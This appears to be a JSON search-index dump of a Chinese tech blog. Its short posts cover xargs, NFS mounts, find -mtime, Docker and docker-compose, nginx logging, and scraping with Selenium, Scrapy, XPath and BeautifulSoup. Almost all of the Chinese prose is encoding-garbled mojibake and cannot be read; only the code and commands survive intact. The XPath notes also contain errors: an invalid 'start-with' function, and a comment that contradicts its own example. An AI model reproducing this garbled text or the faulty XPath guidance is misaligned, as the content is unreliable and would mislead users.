‡å‡†è¾“å…¥åˆ†è§£æˆä¸€ä¸ªä¸ªå‘½ä»¤è¡Œå‚æ•°ã€‚ echo \"one two three\" | xargs mkdir ä¸Šé¢å‘½ä»¤ä¸­ï¼Œmkdirä¼šæ–°å»ºä¸‰ä¸ªå­ç›®å½•ï¼Œå› ä¸ºxargså°†one two threeåˆ†è§£æˆä¸‰ä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼Œæ‰§è¡Œmkdir one two threeã€‚ echo -e \"a\\tb\\tc\" | xargs -d \"\\t\" echo -då‚æ•°å¯ä»¥æ›´æ”¹åˆ†éš”ç¬¦ ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:1","tags":[],"title":"xargså‘½ä»¤ä½¿ç”¨","uri":"/post/2110/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"2. -pï¼Œ-t å‚æ•°-æç¤ºå’Œè¯¢é—® -pæ˜¯æ‰“å°æœ€ç»ˆæ‰§è¡Œçš„å‘½ä»¤,å¹¶ä¸”è¯¢é—®æ˜¯å¦æ‰§è¡Œ echo 'one two three' | xargs -p touch touch one two three ?... -tæ˜¯æ‰“å°å‡ºæœ€ç»ˆæ‰§è¡Œçš„å‘½ä»¤,ç›´æ¥æ‰§è¡Œ echo 'one two three' | xargs -t rm rm one two three ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:2","tags":[],"title":"xargså‘½ä»¤ä½¿ç”¨","uri":"/post/2110/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"3. -0 å‚æ•°ä¸findå‘½ä»¤-nullä½œä¸ºåˆ†éš”ç¬¦ ç”±äºxargsé»˜è®¤å°†ç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦ï¼Œæ‰€ä»¥ä¸å¤ªé€‚åˆå¤„ç†æ–‡ä»¶åï¼Œå› ä¸ºæ–‡ä»¶åå¯èƒ½åŒ…å«ç©ºæ ¼ã€‚ findå‘½ä»¤æœ‰ä¸€ä¸ªç‰¹åˆ«çš„å‚æ•°-print0ï¼ŒæŒ‡å®šè¾“å‡ºçš„æ–‡ä»¶åˆ—è¡¨ä»¥nullåˆ†éš”ã€‚ç„¶åï¼Œxargså‘½ä»¤çš„-0å‚æ•°è¡¨ç¤ºç”¨nullå½“ä½œåˆ†éš”ç¬¦ã€‚ find /tmp -type f -mtime 0 -print0 | xargs -p0 rm rm /tmp/one /tmp/two /tmp/three ?... ä¸Šé¢å‘½ä»¤åˆ é™¤/tmpè·¯å¾„ä¸‹å½“å¤©ä¿®æ”¹çš„æ–‡ä»¶ã€‚ç”±äºåˆ†éš”ç¬¦æ˜¯nullï¼Œæ‰€ä»¥å¤„ç†åŒ…å«ç©ºæ ¼çš„æ–‡ä»¶åï¼Œä¹Ÿä¸ä¼šæŠ¥é”™ã€‚ è¿˜æœ‰ä¸€ä¸ªåŸå› ï¼Œä½¿å¾—xargsç‰¹åˆ«é€‚åˆfindå‘½ä»¤ã€‚æœ‰äº›å‘½ä»¤ï¼ˆæ¯”å¦‚rmï¼‰ä¸€æ—¦å‚æ•°è¿‡å¤šä¼šæŠ¥é”™\"å‚æ•°åˆ—è¡¨è¿‡é•¿\"ï¼Œè€Œæ— æ³•æ‰§è¡Œï¼Œæ”¹ç”¨xargså°±æ²¡æœ‰è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºå®ƒå¯¹æ¯ä¸ªå‚æ•°æ‰§è¡Œä¸€æ¬¡å‘½ä»¤ã€‚ find . -name \"*.txt\" | xargs grep \"abc\" ä¸Šé¢å‘½ä»¤æ‰¾å‡ºæ‰€æœ‰ TXT æ–‡ä»¶ä»¥åï¼Œå¯¹æ¯ä¸ªæ–‡ä»¶æœç´¢ä¸€æ¬¡æ˜¯å¦åŒ…å«å­—ç¬¦ä¸²abcã€‚ ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:3","tags":[],"title":"xargså‘½ä»¤ä½¿ç”¨","uri":"/post/2110/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"4. -Lå‚æ•°-æŒ‰è¡Œä½œä¸ºå‚æ•° æ ‡å‡†è¾“å…¥åŒ…å«å¤šè¡Œ,ä½†æ˜¯findä¸èƒ½æ¥æ”¶è¿™æ ·çš„å‚æ•°ã€‚ä¼šæŠ¥é”™ echo -en 'a\\nb\\nc' | xargs -p find ./ -name find ./ -name a b c ?... å¯ä»¥ä½¿ç”¨-Lå‚æ•°æŒ‡å®šå¤šå°‘è¡Œä½œä¸ºä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°ã€‚(åˆ†åˆ«è¿è¡Œäº†1æ¬¡findå‘½ä»¤) echo -en 'a\\nb\\nc' | xargs -pL 1 find ./ -name find ./ -name a ?... find ./ -name b ?... find ./ -name c ?... ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:4","tags":[],"title":"xargså‘½ä»¤ä½¿ç”¨","uri":"/post/2110/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"5. -nå‚æ•°-åˆ†å‰²nä¸ªå‚æ•°ä½œä¸ºä¸€ä¸ªå‚æ•° echo -en 'hello world b c' | xargs -p find ./ -name ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:5","tags":[],"title":"xargså‘½ä»¤ä½¿ç”¨","uri":"/post/2110/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"6. -i/Iå‚æ•°-å°†æ ‡å‡†è¾“å…¥å­˜å…¥å˜é‡ -iå°†æ ‡å‡†è¾“å…¥èµ‹å€¼ç»™{}, -I xxxå¯ä»¥è‡ªå®šä¹‰èµ‹å€¼ç»™è° echo -e '1,2,3\\n4\\n5\\n6' | xargs -I txt ls txt ls: cannot access '1,2,3': No such file or directory ls: cannot access '4': No such file or directory ls: cannot access '5': No such file or directory ls: cannot access '6': No such file or directory æˆ–è€… echo -e '1,2,3\\n4\\n5\\n6' | xargs -i ls {} åˆ©ç”¨-Iæ‰§è¡Œå¤šæ¡å‘½ä»¤ $ cat foo.txt one two three $ cat foo.txt | xargs -I file sh -c 'echo file; mkdir file' one two three $ ls one two three ä¸Šé¢ä»£ç ä¸­ï¼Œfoo.txtæ˜¯ä¸€ä¸ªä¸‰è¡Œçš„æ–‡æœ¬æ–‡ä»¶ã€‚æˆ‘ä»¬å¸Œæœ›å¯¹æ¯ä¸€é¡¹å‘½ä»¤è¡Œå‚æ•°ï¼Œæ‰§è¡Œä¸¤ä¸ªå‘½ä»¤ï¼ˆechoå’Œmkdirï¼‰ ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:6","tags":[],"title":"xargså‘½ä»¤ä½¿ç”¨","uri":"/post/2110/"},{"categories":["åŸºç¡€å†…å®¹","ç³»ç»ŸæœåŠ¡"],"content":"æ–°åˆ†åŒºï¼š/sdb1 æŒ‚è½½ç›®å½•ï¼š/nfsdata/aaa mount /dev/sdb1 /nfsdata/aaa åˆ›å»ºç›®å½•å’Œæ–‡ä»¶ mkdir /nfsdata/aaa/{bbb,ccc} touch /nfsdata/aaa/{bbb,ccc}/123 nfsé…ç½®æ–‡ä»¶/etc/exports /nfsdata 10.1.0.0/24(rw,sync,no_root_squash,no_all_squash) /nfsdata/aaa 10.1.0.0/24(rw,sync,no_root_squash,no_all_squash) é€šè¿‡nfsæŒ‚è½½ mount -t nfs 10.1.0.10:/nfsdata/aaa /nfstest # æŒ‚è½½æˆåŠŸä½†æ˜¯/nfstestç›®å½•æ²¡æœ‰å†…å®¹(æŒ‚è½½åˆ°åŸåˆ†åŒºäº†) mount -t nfs 10.1.0.10:/nfsdata/aaa/bbb /nfstest # æŒ‚è½½æˆåŠŸnfstestç›®å½•æœ‰å†…å®¹(æŒ‚è½½åˆ°æ–°åˆ†åŒºäº†) å½“çˆ¶çº§ç›®å½•å·²å…±äº«æ—¶ï¼Œåªæœ‰æŒ‚è½½å…±äº«ç›®å½•çš„å­ç›®å½•çš„æ—¶å€™æ‰èƒ½æˆåŠŸ ","date":"2020-12-16 11:11","objectID":"/post/2107/:0:0","tags":["nfs"],"title":"nfsæŒ‚è½½é—®é¢˜","uri":"/post/2107/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"find -mtime +N/-N/N -mtime n : åœ¨nå¤©ä¹‹å‰çš„å½“å¤©è¢«ä¿®æ”¹æ–‡ä»¶ æ¯”å¦‚ä»Šå¤©æ˜¯1æœˆ10æ—¥, -mtime 3,å°±ä»£è¡¨1æœˆ7å·å½“å¤©è¢«ä¿®æ”¹çš„æ–‡ä»¶ -mtime +n : åœ¨nå¤©ä¹‹å‰ï¼ˆä¸å«nå¤©æœ¬èº«ï¼‰è¢«ä¿®æ”¹çš„æ–‡ä»¶ æ¯”å¦‚ä»Šå¤©æ˜¯1æœˆ10æ—¥, -mtime +3,å°±ä»£è¡¨1æœˆ7å·ä¹‹å‰è¢«ä¿®æ”¹çš„æ–‡ä»¶(ä¸åŒ…æ‹¬1æœˆ7å·) -mtime -n : åœ¨nå¤©ä¹‹å†…ï¼ˆå«nå¤©æœ¬èº«ï¼‰è¢«ä¿®æ”¹çš„æ–‡ä»¶ æ¯”å¦‚ä»Šå¤©æ˜¯1æœˆ10æ—¥, -mtime -3,å°±ä»£è¡¨1æœˆ7å·ä¹‹å†…è¢«ä¿®æ”¹çš„æ–‡ä»¶(åŒ…æ‹¬1æœˆ7å·) ","date":"2020-12-11 18:10","objectID":"/post/2098/:0:0","tags":["linux"],"title":"find -mtimeçš„å«ä¹‰","uri":"/post/2098/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"nçš„å«ä¹‰æ˜¯ï¼šn*24å°æ—¶ï¼Œç³»ç»Ÿè®¡ç®—ä¹Ÿæ˜¯æŒ‰ç…§å°æ—¶æ¥è®¡ç®—çš„ï¼Œæ‰€ä»¥æœ‰æ—¶å€™ä¼šå‘ç°æ˜¯å½“å¤©çš„æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°ï¼Œå› ä¸ºä»–æ˜¯æŒ‰ç…§å½“å‰çš„æ—¶é—´å¾€å‰æ¨n*24å°æ—¶çš„","date":"2020-12-11 18:10","objectID":"/post/2098/:1:0","tags":["linux"],"title":"find -mtimeçš„å«ä¹‰","uri":"/post/2098/"},{"categories":["å…¶ä»–"],"content":"ä»£ç ï¼š cat \u003e NowString.java \u003c\u003cEOF import java.util.Date; import java.text.SimpleDateFormat; public class NowString { public static void main(String[] args) { SimpleDateFormat df = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\"); System.out.println(df.format(new Date())); } } EOF ç¼–è¯‘ï¼š javac NowString.java è¿è¡Œ: java NowString ","date":"2020-11-30 10:19","objectID":"/post/2087/:0:0","tags":["java"],"title":"javaè·å–ç³»ç»Ÿå½“å‰æ—¶é—´","uri":"/post/2087/"},{"categories":["docker"],"content":"æŠ¥é”™ Caused by: java.lang.NullPointerException: null at sun.awt.FontConfiguration.getVersion(FontConfiguration.java:1264) at sun.awt.FontConfiguration.readFontConfigFile(FontConfiguration.java:219) at sun.awt.FontConfiguration.init(FontConfiguration.java:107) at sun.awt.X11FontManager.createFontConfiguration(X11FontManager.java:774) at sun.font.SunFontManager$2.run(SunFontManager.java:431) at java.security.AccessController.doPrivileged(Native Method) at sun.font.SunFontManager.\u003cinit\u003e(SunFontManager.java:376) å®‰è£…ttf-dejavu dockerfile FROM openjdk:8u212-jdk-alpine RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories RUN apk update \u0026\u0026 apk add ttf-dejavu tzdata \u0026\u0026 cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\ \u0026\u0026 echo \"Asia/Shanghai\" \u003e /etc/timezone \\ \u0026\u0026 apk del tzdata \u0026\u0026 rm -rf /var/cache/apk/* ","date":"2020-11-27 13:16","objectID":"/post/2086/:0:0","tags":["docker"],"title":"alpineç¼ºå°‘FontConfigurationæŠ¥ç©ºæŒ‡é’ˆ","uri":"/post/2086/"},{"categories":["python"],"content":"ä¸€ã€ä¸‹è½½é…ç½®driver https://npm.taobao.org/mirrors/chromedriver/83.0.4103.39/ è§£å‹åç§»åŠ¨åˆ°ä¸‹é¢ç›®å½• mv chromedriver /usr/local/bin/ ","date":"2020-11-26 16:21","objectID":"/post/2085/:1:0","tags":["python","çˆ¬è™«"],"title":"seleniumå…¥é—¨","uri":"/post/2085/"},{"categories":["python"],"content":"äºŒã€å®‰è£…selenium pip install selenium ","date":"2020-11-26 16:21","objectID":"/post/2085/:2:0","tags":["python","çˆ¬è™«"],"title":"seleniumå…¥é—¨","uri":"/post/2085/"},{"categories":["python"],"content":"ä¸‰ã€ç®€å•ä½¿ç”¨ #!/usr/bin/python # -*- coding: UTF-8 -*- \"\"\" @author:soulchild @file:selenium_learn.py @time:2020/11/26 \"\"\" from selenium import webdriver import time # å®ä¾‹åŒ–driverå¯¹è±¡ driver = webdriver.Chrome() # å¦‚æœæ²¡æœ‰é…ç½®ç¯å¢ƒå˜é‡,å¯ä»¥ç”¨executable_pathæŒ‡å®šæµè§ˆå™¨é©±åŠ¨æ–‡ä»¶è·¯å¾„ # æ‰“å¼€æµè§ˆå™¨å‘é€è¯·æ±‚ driver.get(\"http://soulchild.cn\") # è·å–è¾“å…¥æ¡†å…ƒç´  search_element = driver.find_element_by_id('search').find_element_by_tag_name('input') # å‘å…ƒç´ å‘é€å†…å®¹ search_element.send_keys('docker') # ç‚¹å‡»æœç´¢ # driver.find_element_by_id('search').find_element_by_id('stss').click() driver.execute_script(\"document.getElementById('stss').click()\") # å…¶ä»–æ“ä½œ # driver.page_source å½“å‰æ ‡ç­¾é¡µæµè§ˆå™¨æ¸²æŸ“ä¹‹åçš„ç½‘é¡µæºä»£ç  # driver.current_url å½“å‰æ ‡ç­¾é¡µçš„url # driver.title å½“å‰æ ‡ç­¾é¡µæ ‡é¢˜ # driver.close() å…³é—­å½“å‰æ ‡ç­¾é¡µï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªæ ‡ç­¾é¡µåˆ™å…³é—­æ•´ä¸ªæµè§ˆå™¨ # driver.quit() å…³é—­æµè§ˆå™¨ # driver.forward() é¡µé¢å‰è¿› # driver.back() é¡µé¢åé€€ # driver.save_screenshot('img_name') é¡µé¢æˆªå›¾ ","date":"2020-11-26 16:21","objectID":"/post/2085/:3:0","tags":["python","çˆ¬è™«"],"title":"seleniumå…¥é—¨","uri":"/post/2085/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"** åœ¨è¦æ”¶é›†çš„è¯·æ±‚å¤´å‰é¢åŠ $httpå‰ç¼€å³å¯ ** ä¾‹å¦‚user_agentå’Œreferer åœ¨æ—¥å¿—å°±å¡«å†™å†…å®¹å¦‚ä¸‹: $http_user_agent $http_referer log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\" '; æ³¨: å¦‚æœè¯·æ±‚å¤´æ˜¯xx-xxï¼Œéœ€è¦å†™æˆ$http_xx_xx ","date":"2020-11-25 14:21","objectID":"/post/2081/:0:0","tags":["nginx"],"title":"nginxæ·»åŠ è¯·æ±‚å¤´ä½œä¸ºæ—¥å¿—","uri":"/post/2081/"},{"categories":["docker"],"content":"å®˜æ–¹æ–‡æ¡£ ç¼–æ’è¯­æ³•: https://docs.docker.com/compose/compose-file å‘½ä»¤è¡Œå·¥å…·: https://docs.docker.com/compose/reference/ ","date":"2020-11-24 16:25","objectID":"/post/2079/:0:0","tags":["docker"],"title":"docker-composeç¼–æ’","uri":"/post/2079/"},{"categories":["docker"],"content":"ç¼–æ’æ–‡ä»¶ç‰ˆæœ¬å’Œdockerå¼•æ“ç‰ˆæœ¬å¯¹åº”å…³ç³» ç‰ˆæœ¬ dockerç‰ˆæœ¬ 3.8 19.03.0+ 3.7 18.06.0+ 3.6 18.02.0+ 3.5 17.12.0+ 3.4 17.09.0+ 3.3 17.06.0+ 3.2 17.04.0+ 3.1 1.13.1+ 3.0 1.13.0+ 2.4 17.12.0+ 2.3 17.06.0+ 2.2 1.13.0+ 2.1 1.12.0+ 2.0 1.10.0+ 1.0 1.9.1.+ ","date":"2020-11-24 16:25","objectID":"/post/2079/:1:0","tags":["docker"],"title":"docker-composeç¼–æ’","uri":"/post/2079/"},{"categories":["docker"],"content":"v3é…ç½®è¯´æ˜ version: \"3.8\" services: # å®šä¹‰æœåŠ¡ redis: # æœåŠ¡å(è‡ªå®šä¹‰) image: redis:alpine # æœåŠ¡é•œåƒ ports: # å®šä¹‰æœåŠ¡æ‰€ç”¨ç«¯å£å’Œæ˜ å°„ - \"6379\" networks: # å®šä¹‰è¦ä½¿ç”¨çš„ç½‘ç»œ - frontend # åœ¨ä¸‹é¢çš„networksä¸­å®šä¹‰çš„ db: # æœåŠ¡å(è‡ªå®šä¹‰) image: postgres:9.4 # æœåŠ¡é•œåƒ volumes: # å®šä¹‰æŒä¹…åŒ–å· - db-data:/var/lib/postgresql/data # ä½¿ç”¨db-dataè¿™ä¸ªå·ï¼Œåœ¨ä¸‹é¢çš„volumesä¸­å®šä¹‰çš„ã€‚å°†å®¹å™¨çš„/var/lib/postgresql/dataç›®å½•æŒä¹…åŒ–åˆ°db-dataè¿™ä¸ªå·ä¸­ environment: # è®¾ç½®ç¯å¢ƒå˜é‡ RACK_ENV: development # ç¬¬ä¸€ç§å†™æ³• - RACK_ENV2=development # ç¬¬äºŒç§å†™æ³• web: # æœåŠ¡å(è‡ªå®šä¹‰) build: ./nginx # æŒ‡å®šæ„å»ºé•œåƒä¸Šä¸‹æ–‡ã€‚ç„¶åè¿è¡Œã€‚ nginxç›®å½•å†…å®¹ä¸ºDockerfile ports: # æ˜ å°„ç«¯å£ - \"8000:80\" # å®¿ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£ restart: always # é‡å¯ç­–ç•¥ã€‚é»˜è®¤on,å¯é€‰always,on-failure,unless-stopped container_name: nginx-web # å®¹å™¨åç§° labels: # è®¾ç½®æ ‡ç­¾å…ƒæ•°æ® web: true # ç¬¬ä¸€ç§å†™æ³• - \"web=true\" # ç¬¬ä¸€ç§å†™æ³• vote: # æœåŠ¡å(è‡ªå®šä¹‰) image: dockersamples/examplevotingapp_vote:before ports: - \"5000:80\" # å®¿ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£ networks: - frontend depends_on: # ä¾èµ–å¯åŠ¨ - redis # ç­‰å¾…redisæœåŠ¡å¯åŠ¨å,å†å¯åŠ¨æœ¬æœåŠ¡ result: # æœåŠ¡å(è‡ªå®šä¹‰) image: dockersamples/examplevotingapp_result:before ports: - \"5001:80\" # å®¿ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£ networks: - backend depends_on: # ä¾èµ–å¯åŠ¨ - db # ç­‰å¾…dbæœåŠ¡å¯åŠ¨å,å†å¯åŠ¨æœ¬æœåŠ¡ visualizer: image: dockersamples/visualizer:stable ports: - \"8080:8080\" stop_grace_period: 1m30s # é»˜è®¤æƒ…å†µä¸‹å‘å®¹å™¨å‘é€SIGTERMä¿¡å·(kill -15),10ç§’å†…æ²¡æœ‰åœæ­¢æˆåŠŸå°±ä¼šå‘é€SIGKILLä¿¡å·(kill -9) volumes: - \"/var/run/docker.sock:/var/run/docker.sock\" # å°†å®¿ä¸»æœºçš„/var/run/docker.sockæ–‡ä»¶æŒ‚è½½åˆ°å®¹å™¨çš„/var/run/docker.sock networks: frontend: # åˆ›å»ºç½‘ç»œ backend: # åˆ›å»ºç½‘ç»œ volumes: db-data: # åˆ›å»ºvolume ","date":"2020-11-24 16:25","objectID":"/post/2079/:2:0","tags":["docker"],"title":"docker-composeç¼–æ’","uri":"/post/2079/"},{"categories":["python"],"content":" import scrapy class FirstSpider(scrapy.Spider): name = 'first' # allowed_domains = ['www.soulchild.cn'] start_urls = ['http://www.qiushibaike.com/text'] def parse(self, response): div_list = response.xpath('//div[contains(@class,\"article\") and contains(@class,\"mb15\")]') all_data = [] for i in div_list: author = i.xpath('./div[@class=\"author clearfix\"]//h2/text()')[0].get() content = ''.join(i.xpath('.//div[@class=\"content\"]/span//text()').getall()) res = { \"author\": author, \"content\": content, } all_data.append(res) return all_data å°†parseæ–¹æ³•çš„è¿”å›å€¼è¾“å‡ºåˆ°æœ¬åœ°csvæ–‡ä»¶ä¸­ scrapy crawl first -o qs.csv æ”¯æŒçš„æ ¼å¼ï¼š 'json', 'jsonlines', 'jl', 'csv', 'xml', 'marshal', 'pickle' ","date":"2020-11-23 16:44","objectID":"/post/2078/:0:0","tags":["python","çˆ¬è™«","scrapy"],"title":"scrapy-å‘½ä»¤è¡ŒæŒä¹…åŒ–æ•°æ®åˆ°æœ¬åœ°","uri":"/post/2078/"},{"categories":["python"],"content":"1.å®‰è£… pip install scrapy ","date":"2020-11-18 09:44","objectID":"/post/2076/:1:0","tags":["python","çˆ¬è™«","scrapy"],"title":"scrapy-ç¯å¢ƒå®‰è£…+åŸºæœ¬é…ç½®","uri":"/post/2076/"},{"categories":["python"],"content":"2.åˆ›å»ºé¡¹ç›® scrapy startproject é¡¹ç›®åç§° ä¾‹: scrapy startproject firstBlood ","date":"2020-11-18 09:44","objectID":"/post/2076/:2:0","tags":["python","çˆ¬è™«","scrapy"],"title":"scrapy-ç¯å¢ƒå®‰è£…+åŸºæœ¬é…ç½®","uri":"/post/2076/"},{"categories":["python"],"content":"2.1ç›®å½•ç»“æ„ firstBlood/ â”œâ”€â”€ firstBlood â”‚Â â”œâ”€â”€ __init__.py â”‚Â â”œâ”€â”€ items.py â”‚Â â”œâ”€â”€ middlewares.py â”‚Â â”œâ”€â”€ pipelines.py â”‚Â â”œâ”€â”€ settings.py â”‚Â â””â”€â”€ spiders # çˆ¬è™«æ–‡ä»¶å­˜æ”¾ç›®å½• â”‚Â â””â”€â”€ __init__.py â””â”€â”€ scrapy.cfg ","date":"2020-11-18 09:44","objectID":"/post/2076/:2:1","tags":["python","çˆ¬è™«","scrapy"],"title":"scrapy-ç¯å¢ƒå®‰è£…+åŸºæœ¬é…ç½®","uri":"/post/2076/"},{"categories":["python"],"content":"3.ç”Ÿæˆçˆ¬è™«æ–‡ä»¶ è¿›å…¥é¡¹ç›®ç›®å½• cd firstBlood scrapy genspider çˆ¬è™«åç§° èµ·å§‹url ä¾‹: scrapy genspider first www.soulchild.cn åˆ›å»ºåçš„æ–‡ä»¶åœ¨firstBlood/spiders/first.pyç›®å½• ","date":"2020-11-18 09:44","objectID":"/post/2076/:3:0","tags":["python","çˆ¬è™«","scrapy"],"title":"scrapy-ç¯å¢ƒå®‰è£…+åŸºæœ¬é…ç½®","uri":"/post/2076/"},{"categories":["python"],"content":"4.è¿è¡Œçˆ¬è™« scrapy crawl çˆ¬è™«åç§° ä¾‹: scrapy crawl first ","date":"2020-11-18 09:44","objectID":"/post/2076/:4:0","tags":["python","çˆ¬è™«","scrapy"],"title":"scrapy-ç¯å¢ƒå®‰è£…+åŸºæœ¬é…ç½®","uri":"/post/2076/"},{"categories":["python"],"content":"é…ç½®ä¿®æ”¹ settings.py USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' ROBOTSTXT_OBEY = False LOG_LEVEL = 'ERROR' ","date":"2020-11-18 09:44","objectID":"/post/2076/:5:0","tags":["python","çˆ¬è™«","scrapy"],"title":"scrapy-ç¯å¢ƒå®‰è£…+åŸºæœ¬é…ç½®","uri":"/post/2076/"},{"categories":["python"],"content":"ä¸€.xpathè¯­æ³• /: æ ¹èŠ‚ç‚¹å¼€å§‹æŸ¥æ‰¾ //: ä»ä»»æ„èŠ‚ç‚¹å¼€å§‹æ‰¾ .: å½“å‰èŠ‚ç‚¹ ..: ä¸Šä¸€çº§èŠ‚ç‚¹ ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:0","tags":["python","çˆ¬è™«"],"title":"xpath-åŸºç¡€","uri":"/post/2075/"},{"categories":["python"],"content":"å±æ€§æŸ¥æ‰¾ //h2[@class=\"post-title\"]: æŸ¥æ‰¾classå±æ€§ä¸ºxxxçš„h2æ ‡ç­¾ //div[@itemprop='articleBody']: æŸ¥æ‰¾itempropå±æ€§ä¸ºarticleBodyçš„divæ ‡ç­¾ //h2[@class=\"post-title\"]/a: æŸ¥æ‰¾classå±æ€§ä¸ºpost-titleçš„h2æ ‡ç­¾ï¼Œä¸‹é¢çš„æ‰€æœ‰aæ ‡ç­¾ ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:1","tags":["python","çˆ¬è™«"],"title":"xpath-åŸºç¡€","uri":"/post/2075/"},{"categories":["python"],"content":"è·å–æ ‡ç­¾çš„æ–‡æœ¬å†…å®¹ (//h2[@class=\"post-title\"]/a)[2]/text(): è·å–æ ‡ç­¾çš„æ–‡æœ¬å†…å®¹(å½“å‰æ ‡ç­¾çš„æ–‡æœ¬ï¼Œä¸åŒ…æ‹¬å­æ ‡ç­¾) (//h2[@class=\"post-title\"]/a)[2]//text(): è·å–æ ‡ç­¾çš„æ–‡æœ¬å†…å®¹(åŒ…æ‹¬å­æ ‡ç­¾) ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:2","tags":["python","çˆ¬è™«"],"title":"xpath-åŸºç¡€","uri":"/post/2075/"},{"categories":["python"],"content":"è·å–æ ‡ç­¾çš„å±æ€§å€¼ //h2[@class=\"post-title\"]/a/@href: è·å–æ ‡ç­¾çš„å±æ€§å€¼ ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:3","tags":["python","çˆ¬è™«"],"title":"xpath-åŸºç¡€","uri":"/post/2075/"},{"categories":["python"],"content":"å±æ€§+ä½ç½®æŸ¥æ‰¾æ ‡ç­¾ (//h2[@class=\"post-title\"]/a)[2]: ç¬¬äºŒä¸ªaæ ‡ç­¾ ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:4","tags":["python","çˆ¬è™«"],"title":"xpath-åŸºç¡€","uri":"/post/2075/"},{"categories":["python"],"content":"last (//h2[@class=\"post-title\"]/a)[last()]: â€¦æœ€åä¸€ä¸ªaæ ‡ç­¾ (//h2[@class=\"post-title\"]/a)[last()-1]: â€¦å€’æ•°ç¬¬äºŒä¸ªaæ ‡ç­¾ ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:5","tags":["python","çˆ¬è™«"],"title":"xpath-åŸºç¡€","uri":"/post/2075/"},{"categories":["python"],"content":"position (//h2[@class=\"post-title\"]/a)[position()\u003e3]: è·å–ç¬¬ä¸‰ä¸ªå¾€åçš„aæ ‡ç­¾ (//h2[@class=\"post-title\"]/a)[position()\u003e2][position()\u003c5]: å…ˆä»ç¬¬ä¸‰ä¸ªå¼€å§‹æ‰¾,å†æ‰¾4ä¸ªæ ‡ç­¾ã€‚æ—¢è·å–ç¬¬3-6ä¸ªæ ‡ç­¾ ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:6","tags":["python","çˆ¬è™«"],"title":"xpath-åŸºç¡€","uri":"/post/2075/"},{"categories":["python"],"content":"contains åŒ…å« //div[contains(@class,\"article\") and contains(@class,\"mb15\")] # è·å–divçš„classå±æ€§ä¸­åŒ…å«articleå’Œmb15çš„æ ‡ç­¾ //div[contains(@class,\"article\") or contains(@class,\"mb15\")] # è·å–divçš„classå±æ€§ä¸­åŒ…å«articleæˆ–mb15çš„æ ‡ç­¾ ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:7","tags":["python","çˆ¬è™«"],"title":"xpath-åŸºç¡€","uri":"/post/2075/"},{"categories":["python"],"content":"ä»¥xxå¼€å¤´xxç»“å°¾ div[start-with(@class,'a')] # è·å–divçš„classå±æ€§ä¸­ä»¥aå¼€å¤´çš„æ ‡ç­¾ div[ends-with(@class,'b')] # è·å–divçš„classå±æ€§ä¸­ä»¥aç»“å°¾çš„æ ‡ç­¾ ","date":"2020-11-16 17:23","objectID":"/post/2075/:1:8","tags":["python","çˆ¬è™«"],"title":"xpath-åŸºç¡€","uri":"/post/2075/"},{"categories":["python"],"content":"äºŒ.pythonæ“ä½œ #!/usr/bin/python # -*- coding: UTF-8 -*- \"\"\" @author:soulchild @file:xpath_learn.py @time:2020/11/16 \"\"\" from lxml import etree import requests if __name__ == '__main__': # ä¸€ã€åŠ è½½æœ¬åœ°htmlæ–‡ä»¶ # tree = etree.parse('./xxx.html') # äºŒã€åŠ è½½ç½‘ç»œèµ„æº headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\"} resp = requests.get('https://soulchild.cn', headers=headers).content.decode('utf-8') tree = etree.HTML(resp) ele = tree.xpath('//h2[@class=\"post-title\"]/a/text()') ","date":"2020-11-16 17:23","objectID":"/post/2075/:2:0","tags":["python","çˆ¬è™«"],"title":"xpath-åŸºç¡€","uri":"/post/2075/"},{"categories":["python"],"content":"å®‰è£…æ¨¡å— pip install bs4 lxml #!/usr/bin/python # -*- coding: UTF-8 -*- \"\"\" @author:soulchild @file:bs4_learn.py @time:2020/11/16 \"\"\" from bs4 import BeautifulSoup import requests if __name__ == '__main__': # ä¸€ã€åŠ è½½æœ¬åœ°htmlæ–‡ä»¶ # fp = open('./xxx.html', 'r', encoding='utf-8') # soup = BeautifulSoup(fp, 'lxml') # äºŒã€åŠ è½½ç½‘ç»œèµ„æº headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\"} resp = requests.get('https://soulchild.cn', headers=headers).content.decode('utf-8') soup = BeautifulSoup(resp, 'lxml') # 